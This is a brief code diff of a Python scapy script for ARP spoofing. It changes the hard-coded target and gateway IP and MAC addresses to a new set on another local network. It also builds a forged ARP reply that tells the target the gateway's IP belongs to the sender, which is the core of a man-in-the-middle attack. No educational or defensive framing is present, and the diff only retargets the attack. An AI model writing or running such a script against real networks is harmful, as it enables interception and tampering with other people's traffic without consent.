@@ -1,11 +1,11 @@
 from scapy.all import Ether, ARP, sendp
 import time
 
-target_ip = "192.168.0.157"
-target_mac = "fc:b3:bc:c6:bf:65"
+target_ip = "192.168.28.116"
+target_mac = "10:ff:e0:3e:06:03"
 
-gateway_ip = "192.168.0.1"   
-gateway_mac = "90:9a:4a:fc:9b:ed" 
+gateway_ip = "192.168.28.1"   
+gateway_mac = "88:c3:97:83:9a:4f" 
 
 packet_to_target = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
 
